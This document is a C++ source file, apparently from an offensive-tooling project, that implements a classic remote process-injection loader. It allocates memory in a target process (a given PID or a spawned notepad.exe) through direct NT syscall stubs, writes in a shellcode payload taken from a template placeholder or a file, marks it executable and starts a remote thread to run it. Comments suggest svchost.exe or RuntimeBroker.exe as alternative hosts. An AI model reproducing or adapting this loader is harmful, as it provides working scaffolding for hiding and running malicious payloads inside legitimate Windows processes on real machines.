/**
Author: Thomas X Meng
Classic NT API
***/
#include <windows.h>
#include <cstdio>
#include "./classic_stubs/syscalls.h" // Import the generated header.

typedef DWORD(WINAPI *PFN_GETLASTERROR)();
typedef void (WINAPI *PFN_GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);

// -bin: 
unsigned char* magic_code = NULL;
SIZE_T allocatedSize = 0; 

unsigned char magiccode[] = ####SHELLCODE####;

// -bin
BOOL ReadContents(PCWSTR Filepath, unsigned char** magiccode, SIZE_T* magiccodeSize);

void Injectmagiccode(const HANDLE hProcess, const unsigned char* magiccode, SIZE_T magiccodeSize);

void Injectmagiccode(const HANDLE hProcess, const unsigned char* magiccode, SIZE_T magiccodeSize) {
    HANDLE hThread = NULL;
    LPVOID lpAllocationStart = NULL;
    SIZE_T szAllocationSize = magiccodeSize; // Size is now based on magiccode length
    NTSTATUS status;
    ULONG oldProtect = 0;
    
    printf("{+] press any key to continue...\n");
    getchar();
    // Allocation of memory for the magiccode in the target process
    status = NtAllocateVirtualMemory(hProcess, &lpAllocationStart, 0, &szAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status == 0) {
        printf("[+] Memory allocated for magiccode\n");
        //print the address: 
        printf("[+] magiccode address: %p\n", lpAllocationStart);
    } else {
        printf("[-] Memory allocation failed\n");
        return;
    }

    printf("{+] press any key to continue...\n");
    getchar();

    // // Allocation of memory for the magiccode in the target process
    // status = NtAllocateVirtualMemory(GetCurrentProcess(), &lpAllocationStart, 0, &magiccodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    // if (status == 0) {
    //     printf("[+] Memory allocated for magiccode\n");
    // } else {
    //     printf("[-] Memory allocation failed\n");
    //     return;
    // }

    // Writing the magiccode to the allocated memory in the target process
    status = NtWriteVirtualMemory(hProcess, lpAllocationStart, (PVOID)magiccode, (ULONG)magiccodeSize, NULL);
    if (status == 0) {
        printf("[+] magiccode written to memory\n");
    } else {
        printf("[-] Failed to write magiccode to memory\n");
        return;
    }

	// This step is optional, but it's good practice to change the memory protection back to its original state
    status = NtProtectVirtualMemory(hProcess, &lpAllocationStart, &magiccodeSize, PAGE_EXECUTE_READ, &oldProtect);
    if (status == 0) {
        printf("[+] Memory protection changed back successfully\n");
    } else {
        printf("[-] Failed to change memory protection back\n");
    }
    
    // Creating a thread in the target process to execute the magiccode
    status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, lpAllocationStart, NULL, FALSE, 0, 0, 0, NULL);
    if (status == 0) {
        printf("[+] Thread created to execute magiccode\n");
    } else {
        printf("[-] Failed to create thread\n");
        return;
    }

    // Wait for the magiccode to execute
    DWORD waitResult = WaitForSingleObject(hThread, INFINITE); // Use a reasonable timeout as needed
    if (waitResult == WAIT_OBJECT_0) {
        printf("[+] magiccode execution completed\n");
    } else {
        printf("[-] magiccode execution wait failed\n");
    }

    // CloseHandle(hThread);
}


BOOL IsSystem64Bit() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) return FALSE;

    PFN_GETNATIVESYSTEMINFO pGetNativeSystemInfo = (PFN_GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo");
    if (!pGetNativeSystemInfo) {
        FreeLibrary(hKernel32);
        return FALSE;
    }

    BOOL bIsWow64 = FALSE;
    SYSTEM_INFO si = {0};
    pGetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64) {
        bIsWow64 = TRUE;
    }

    FreeLibrary(hKernel32);
    return bIsWow64;
}

int main(int argc, char *argv[])
{

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    DWORD pid = 0;
    char notepadPath[256] = {0};  // Initialise the buffer


    PCWSTR binPath = nullptr;
    // Parse -pid and -bin
    for (int i = 1; i < argc; ++i) {
        if (strcmp(argv[i], "-pid") == 0) {
            if (i + 1 < argc && argv[i + 1][0] >= '0' && argv[i + 1][0] <= '9') {
                pid = atoi(argv[i + 1]);
                i++; // skip PID argument
            }
        } else if (strcmp(argv[i], "-bin") == 0) {
            if (i + 1 >= argc || argv[i + 1][0] == '-') {
                fprintf(stderr, "[-] Error: '-bin' flag requires a valid file path argument.\n");
                fprintf(stderr, "    Usage: loader.exe [-pid <pid>] -bin <path_to_magiccode>\n");
                exit(1);
            }
            size_t wlen = strlen(argv[i + 1]) + 1;
            wchar_t* wpath = new wchar_t[wlen];
            mbstowcs(wpath, argv[i + 1], wlen);
            binPath = wpath;
            i++; // skip bin path
        }
    }

    // If PID was provided, open handles
    if (pid > 0) {
        printf("[+] PID provided: %lu\n", (unsigned long)pid);

        // get pi information from pid:
        pi.hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        pi.hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pid);
    } else {
        
        printf("[-] PID not provided or invalid, launching default process\n");

        if (IsSystem64Bit()) {
            strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\notepad.exe");
            // strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\RuntimeBroker.exe");
            // or svchost.exe
        } else {
            strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\SysWOW64\\notepad.exe");
        }

        BOOL success = CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        if (!success) {
            MessageBox(NULL, "Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
            return 1;
        }
        printf("Notepad started with default settings.\n");
        pid = pi.dwProcessId;
        printf("[+] notepad PID: %lu\n", (unsigned long)pid);
    }


    // -bin
    if (binPath) {
        if (!ReadContents(binPath, &magic_code, &allocatedSize)) {
            fprintf(stderr, "[-] Failed to read binary file\n");
        } else {
            printf("\033[32m[+] Read binary file successfully, size: %zu bytes\033[0m\n", allocatedSize);
            // int ret = woodPecker(pid, pi.hProcess, magic_code, page_size, alloc_gran);
        }
    } else {
        magic_code = magiccode; 
        allocatedSize = sizeof(magiccode);
        printf("\033[32m[+] Using default magiccode with size: %zu bytes\033[0m\n", allocatedSize);
        // int ret = woodPecker(pid, pi.hProcess, magic_code, page_size, alloc_gran);
    }

	printf("[+] Classic execution starts, I will be whispering in your ears 2 \n");
    Injectmagiccode(pi.hProcess, magic_code, allocatedSize);

    // CloseHandle(pi.hProcess);
    // CloseHandle(pi.hThread);

	return 0;
}


BOOL ReadContents(PCWSTR Filepath, unsigned char** magiccode, SIZE_T* magiccodeSize)
{
    FILE* f = NULL;
    _wfopen_s(&f, Filepath, L"rb");
    if (!f) {
        return FALSE;
    }

    fseek(f, 0, SEEK_END);
    long fileSize = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (fileSize <= 0) {
        fclose(f);
        return FALSE;
    }

    unsigned char* buffer = (unsigned char*)malloc(fileSize);
    if (!buffer) {
        fclose(f);
        return FALSE;
    }

    size_t bytesRead = fread(buffer, 1, fileSize, f);
    fclose(f);

    if (bytesRead != fileSize) {
        free(buffer);
        return FALSE;
    }

    *magiccode = buffer;
    *magiccodeSize = (SIZE_T)fileSize;
    return TRUE;
}